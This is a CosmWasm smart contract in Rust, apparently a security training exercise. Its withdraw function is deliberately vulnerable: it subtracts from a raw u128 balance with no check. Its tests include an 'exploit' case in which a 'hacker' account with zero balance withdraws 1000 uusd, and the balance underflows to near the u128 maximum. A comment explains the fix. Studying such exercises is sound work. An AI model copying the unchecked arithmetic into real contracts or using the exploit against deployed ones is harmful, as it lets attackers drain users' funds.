#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    to_binary, BalanceResponse, BankMsg, Binary, Coin, CosmosMsg, Deps, DepsMut, Env, MessageInfo,
    Response, StdError, StdResult, Uint128,
};

use crate::error::ContractError;
use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
use crate::state::USER_BALANCE;

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    _deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    _msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    // admin must provide 1000 uusd when instantiating contract
    if info.funds.len() != 1
        || info.funds[0].denom != "uusd"
        || info.funds[0].amount != Uint128::from(1000_u64)
    {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid instantiation",
        )));
    }

    Ok(Response::new())
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::Deposit {} => try_deposit(deps, info),
        ExecuteMsg::Withdraw { amount } => try_withdraw(deps, info, amount),
    }
}

pub fn try_deposit(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
    // validate uusd sent
    if info.funds.len() != 1 || info.funds[0].denom != "uusd" {
        return Err(ContractError::Std(StdError::generic_err(
            "Invalid deposit!",
        )));
    }

    // update user balance
    USER_BALANCE.update(
        deps.storage,
        &info.sender,
        |balance: Option<u128>| -> StdResult<_> {
            Ok(balance.unwrap_or_default() + info.funds[0].amount.u128())
        },
    )?;

    Ok(Response::new()
        .add_attribute("method", "deposit")
        .add_attribute("amount", info.funds[0].amount))
}

pub fn try_withdraw(
    deps: DepsMut,
    info: MessageInfo,
    amount: u128,
) -> Result<Response, ContractError> {
    // decrease user balance
    USER_BALANCE.update(
        deps.storage,
        &info.sender,
        |balance: Option<u128>| -> StdResult<_> { Ok(balance.unwrap_or_default() - amount) },
    )?;

    // send uusd to user
    let msg = CosmosMsg::Bank(BankMsg::Send {
        to_address: info.sender.to_string(),
        amount: vec![Coin {
            denom: "uusd".to_string(),
            amount: Uint128::from(amount),
        }],
    });

    Ok(Response::new()
        .add_message(msg)
        .add_attribute("method", "withdraw")
        .add_attribute("amount", amount.to_string()))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, _env: Env, msg: QueryMsg) -> StdResult<Binary> {
    match msg {
        QueryMsg::GetBalance { address } => to_binary(&query_balance(deps, address)?),
    }
}

fn query_balance(deps: Deps, address: String) -> StdResult<BalanceResponse> {
    let user_balance = USER_BALANCE
        .may_load(deps.storage, &deps.api.addr_validate(&address)?)
        .unwrap_or_default();
    Ok(BalanceResponse {
        amount: Coin {
            denom: "uusd".to_string(),
            amount: Uint128::from(user_balance.unwrap_or_default()),
        },
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use cosmwasm_std::testing::{mock_dependencies_with_balance, mock_env, mock_info};
    use cosmwasm_std::{coins, from_binary};

    #[test]
    #[should_panic(expected = "Invalid instantiation")]
    fn invalid_init() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));
        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(0, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    fn deposit_success() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // user able to deposit uusd
        let info = mock_info("alice", &coins(100, "uusd"));
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

        // verify deposit succeeded
        let res = query(
            deps.as_ref(),
            mock_env(),
            QueryMsg::GetBalance {
                address: "alice".to_string(),
            },
        )
        .unwrap();
        let value: BalanceResponse = from_binary(&res).unwrap();
        assert_eq!(Uint128::from(100_u64), value.amount.amount);
    }

    #[test]
    #[should_panic(expected = "Invalid deposit!")]
    fn deposit_failure() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // invalid deposit
        let info = mock_info("bob", &coins(10, "uluna".to_string()));
        let msg = ExecuteMsg::Deposit {};
        let _err = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    #[should_panic(expected = "Invalid deposit!")]
    fn exploit_fail() {
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // we send a vector of coins to trick the system we deposited UST
        let malicious_funds: Vec<Coin> = vec![
            Coin {
                denom: "umyr".to_string(),
                amount: Uint128::from(1000_u64),
            },
            Coin {
                denom: "uusd".to_string(),
                amount: Uint128::from(0_u64),
            },
        ];
        let info = mock_info("hacker", &malicious_funds);
        let msg = ExecuteMsg::Deposit {};
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
    }

    #[test]
    fn exploit() {
        // hint: use `cargo test --release` instead of `cargo test`
        let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

        let msg = InstantiateMsg {};
        let info = mock_info("creator", &coins(1000, "uusd".to_string()));
        let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

        // check hacker balance, should be zero
        let res = query(
            deps.as_ref(),
            mock_env(),
            QueryMsg::GetBalance {
                address: "hacker".to_string(),
            },
        )
        .unwrap();
        let value: BalanceResponse = from_binary(&res).unwrap();
        assert_eq!(Uint128::from(0_u64), value.amount.amount);

        /*
        Since user's balance is using Rust's built-in u128 integer type, overflows are possible if overflow-checks is not enabled during profile release.
        Rust will prevent overflow issues to occur in debug mode, to replicate release mode scenario, use `cargo test --release`

        This issue can be easily prevented by using CosmWasm Uint128 to handle arithmetic operations, as overflows are checked by default
        https://docs.rs/cosmwasm-std/latest/src/cosmwasm_std/math/uint128.rs.html#322

        More resources on why this happens
        https://medium.com/coinmonks/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts-9f3c9802dc45
        https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow
        https://stackoverflow.com/a/70776258
         */

        // withdraw funds with 0 balance
        let info = mock_info("hacker", &[]);
        let msg = ExecuteMsg::Withdraw { amount: 1000_u128 };
        let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

        // verify hack succeeded
        let res = query(
            deps.as_ref(),
            mock_env(),
            QueryMsg::GetBalance {
                address: "hacker".to_string(),
            },
        )
        .unwrap();
        let value: BalanceResponse = from_binary(&res).unwrap();
        assert_eq!(
            Uint128::from(340282366920938463463374607431768210456_u128),
            value.amount.amount
        );
    }
}